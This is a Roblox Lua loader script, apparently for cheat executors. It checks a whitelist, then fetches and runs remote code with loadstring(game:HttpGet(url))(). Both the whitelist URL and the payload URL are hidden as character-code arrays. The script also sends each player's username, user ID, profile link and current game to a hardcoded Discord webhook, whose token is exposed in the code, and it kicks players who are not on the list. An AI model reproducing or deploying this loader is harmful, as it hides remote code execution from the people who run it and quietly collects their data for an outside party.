local webhook = "https://discord.com/api/webhooks/1378061993080000663/fc1xcwWe6n3XtSZcTmQF9xctT8QN70_ZeBybQVAKi-29uXLl5gYCW53MggjNv5HZIwaS"

local function decode(arr)
    local s = ""
    for i = 1, #arr do
        s = s .. string.char(arr[i])
    end
    return s
end

local whitelist_chars = {
    104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,
    101,114,99,111,110,116,101,110,116,46,99,111,109,47,108,101,111,110,110,
    120,100,47,119,104,105,116,101,108,108,115,108,108,115,107,115,47,114,101,
    102,115,47,104,101,97,100,115,47,109,97,105,110,47,82,69,65,68,77,69,46,
    109,100
}

local whitelistURL = decode(whitelist_chars)

local HttpService = game:GetService("HttpService")

local function getAvatarUrl(userId)
    local success, response = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. userId .. "&size=420x420&format=Png&isCircular=false"))
    end)
    if success and response and response.data and #response.data > 0 then
        return response.data[1].imageUrl
    else
        return "https://www.roblox.com/asset/?id=1" -- fallback genérico
    end
end

local function sendWebhook(username, autorizado, userId)
    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    local placeId = game.PlaceId
    local hora = os.date("%d/%m/%Y %H:%M:%S")

    local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
    local avatarUrl = getAvatarUrl(userId)

    local data = {
        ["embeds"] = {{
            ["title"] = autorizado and "✅ Player verificado na whitelist!" or "❌ Tentativa de acesso negada!",
            ["description"] = autorizado and "Um jogador entrou no script!" or "Um jogador tentou usar o script sem estar na whitelist!",
            ["fields"] = {
                {["name"] = "**👤 Player**", ["value"] = username, ["inline"] = true},
                {["name"] = "**🎮 Mapa**", ["value"] = gameName .. " (`" .. placeId .. "`)", ["inline"] = false},
                {["name"] = "**🔗 Perfil Roblox**", ["value"] = "[Clique aqui](" .. profileUrl .. ")", ["inline"] = false},
                {["name"] = "**🕒 Data / Horário**", ["value"] = hora, ["inline"] = false}
            },
            ["color"] = autorizado and 65280 or 16711680,
            ["author"] = {
                ["name"] = username,
                ["icon_url"] = avatarUrl
            },
            ["thumbnail"] = {
                ["url"] = avatarUrl
            }
        }},
        ["username"] = "Whitelist Logger"
    }

    local headers = { ["Content-Type"] = "application/json" }
    local body = HttpService:JSONEncode(data)

    local request = (syn and syn.request) or (http and http.request) or http_request or request
    if request then
        request({
            Url = webhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    else
        warn("Executor não suporta envio HTTP.")
    end
end

local function isPlayerWhitelisted(playerName)
    local success, result = pcall(function()
        return HttpService:JSONDecode(game:HttpGet(whitelistURL))
    end)
    if success and typeof(result) == "table" then
        for _, name in ipairs(result) do
            if name == playerName then
                return true
            end
        end
    end
    return false
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.CoreGui

local inputBox = Instance.new("TextBox")
inputBox.Parent = screenGui
inputBox.Size = UDim2.new(0, 400, 0, 50)
inputBox.Position = UDim2.new(0.5, -200, 0.5, -25)
inputBox.PlaceholderText = "Verificando sua whitelist..."
inputBox.Text = ""
inputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
inputBox.TextSize = 20
inputBox.ClearTextOnFocus = false

if not isPlayerWhitelisted(LocalPlayer.Name) then
    inputBox.Text = "❌ Você não está na whitelist!"
    sendWebhook(LocalPlayer.Name, false, LocalPlayer.UserId)
    task.wait(2)
    LocalPlayer:Kick("Você não está na whitelist!")
    return
end

inputBox.Text = "✔️ Você está na whitelist!"
sendWebhook(LocalPlayer.Name, true, LocalPlayer.UserId)
task.wait(1)
screenGui:Destroy()

-- SCRIPT PRINCIPAL CHAR (Atualizado para nova URL)
local t = {
    104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,
    101,114,99,111,110,116,101,110,116,46,99,111,109,47,120,101,110,122,99,
    104,101,97,116,115,47,119,97,110,100,106,107,105,97,119,110,100,112,97,
    119,107,112,100,109,97,119,119,97,100,106,104,119,97,119,106,107,98,100,
    105,119,97,98,100,112,105,97,104,119,45,100,97,47,114,101,102,115,47,104,
    101,97,100,115,47,109,97,105,110,47,82,69,65,68,77,69,46,109,100
}
local url = decode(t)
loadstring(game:HttpGet(url))()
